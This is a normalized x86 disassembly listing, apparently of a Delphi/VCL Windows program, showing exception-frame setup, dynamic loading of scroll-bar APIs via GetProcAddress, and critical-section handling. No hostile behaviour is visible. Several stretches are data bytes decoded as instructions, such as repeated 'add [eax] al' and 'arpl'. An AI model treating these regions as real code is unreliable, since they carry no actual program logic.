mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
call sub_403190
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42aad0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_403190
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_42c200
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c2f3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c2fa
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40499c
lea eax [ ebp - 0x10 ]
call sub_40578c
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42aad0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4057a4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42c318
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c3f7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c3fe
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40499c
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42aad0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057a4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42c418
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405800
xor eax eax
push ebp
push sub_42c467
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c46e
lea eax [ ebx + 0xc ]
call sub_40578c
sub_42c474
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_42c509
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f74
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42c200
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c510
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
call sub_42bd14
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42bd44
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42bee4
sub_42c534
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42aad0
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42aad0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418360
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42aad0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418360
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418360
sub_42c5c0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_42bcd4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403190
mov eax [ esi + 0x14 ]
call sub_403190
mov eax [ esi + 0x10 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40578c
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42c614
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c64b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c652
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42c65c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c681
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c688
retn
sub_42c694
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c6c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c6cc
retn
mov eax [ rw-data ]
call sub_403190
sub_42c6d8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c70c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c734
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c9b6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c9dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9e4
retn
sub_42c9fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
0x42
sub_42ca1c
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c0042ca ] dh
add [ eax ] al
add al bh
leave
inc edx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add ah al
0x42
push esi
test dl dl
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0xcb
inc edx
add [ ebx + ecx * 8 ] bh
inc edx
add [ eax - 0x35 ] cl
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_403544
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42ca60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xca
inc edx
add [ eax + eax ] bl
add [ eax ] al
clc
leave
inc edx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
push esi
test dl dl
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0xcb
inc edx
add [ ebx + ecx * 8 ] bh
inc edx
add [ eax - 0x35 ] cl
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_403544
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42cacc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42cb0c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42cb64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cb89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb90
retn
sub_42cb9c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42cb54
xor eax eax
push ebp
push sub_42cd53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd5a
mov eax [ rw-data ]
call sub_42cb5c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42cd5c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42cb54
xor eax eax
push ebp
push sub_42d10f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d116
mov eax [ rw-data ]
call sub_42cb5c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42d4c0
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42d4e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d530
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d537
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403190
call sub_42cb9c
cmp [ rw-data ] 0x0
jg r-xdata
sub_42d558
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d57d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d584
retn
sub_42d590
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d5b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5bc
retn
sub_42d5c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d5ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5f4
retn
sub_42d600
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d625
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d62c
retn
sub_42d638
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d65d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d664
retn
sub_42d670
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d695
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d69c
retn
sub_42d6a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d6cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d6d4
retn
sub_42d6e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d705
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d70c
retn
sub_42d718
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d73d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d744
retn
sub_42d85b
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
add esp 0xfffffff0
call sub_4034f4
push sub_42d998
call sub_4217e4
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_40354c
je r-xdata
je r-xdata
call sub_420754
mov [ esi + 0x30 ] 0x1
push esi
inc ecx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
je r-xdata
pop [ fs : 0x0 ]
add esp 0xc
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
inc ecx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_42d904
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4207a0
test bl bl
jle r-xdata
call sub_42187c
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42d938
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46d75c
mov cl 0x1
sub_42d960
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4033e0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d998
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d9c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42da30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_46414c
mov [ ebp - 0x14 ] eax
call sub_464068
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
